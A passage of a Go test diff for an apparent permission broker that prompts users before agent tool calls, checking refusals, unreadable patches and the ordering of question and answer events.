+	if r.b.Refuse(p.q.ID, "again") || len(r.b.Open()) != 0 {
+		t.Error("a refused question is still open")
+	}
+	if a := r.answersCopy(); len(a) != 1 || a[0].By != ByCanceled || a[0].Choice != 3 {
+		t.Errorf("answers %+v", a)
+	}
+	if len(*refused) != 2 {
+		t.Errorf("refused %q", *refused)
+	}
+}
+
+// A patch that the apply_patch tool cannot read is refused, not shown as some other change.
+func TestUnreadablePatchesAreRefused(t *testing.T) {
+	r, refused := refusedRig(t, Config{Change: func(string, perm.Request) (string, string, bool) {
+		return "", checkpoint.UnreadPatchPrefix + "patch is empty]\n", true
+	}})
+	if d := r.b.Prompter("shop", "/proj", nil, nil)(context.Background(), perm.Request{Agent: "be-1", Tool: "apply_patch"}); d.Allow ||
+		!strings.Contains(d.Reason, "apply_patch tool reads it") {
+		t.Errorf("%+v", d)
+	}
+	if len(*refused) != 1 {
+		t.Errorf("refused %q", *refused)
+	}
+}
+
+// Whatever resolves a question in the instant it is asked (an interrupt, a closed tab, a refusal of the host), its answer is reported
+// after its ask: a page never gets the answer of a question it has not been shown, and keeps no card that nobody can answer.
+func TestAnAnswerIsNeverReportedBeforeItsAsk(t *testing.T) {
+	var mu sync.Mutex
+	var order []string
+	note := func(s string) {
+		mu.Lock()
+		order = append(order, s)
+		mu.Unlock()
+	}
+	asking := make(chan struct{})
+	b := New(Config{
+		OnAsk: func(string, wire.Question) {
+			close(asking)
+			time.Sleep(200 * time.Millisecond) // the translator and the hub take their time
+			note("ask")
+		},
+		OnAnswer: func(string, wire.Answer) { note("answer") },
+	})
+	defer b.Close()
+	d := make(chan perm.Decision, 1)
+	go func() { d <- b.Prompter("shop", "/proj", nil, nil)(context.Background(), bash) }()
+	<-asking
+	b.CancelTab("shop", ByClosed)
+	<-d
+	mu.Lock()
+	defer mu.Unlock()
+	if !slices.Equal(order, []string{"ask", "answer"}) {
+		t.Errorf("reported %v, want the ask before its answer", order)
+	}
+}
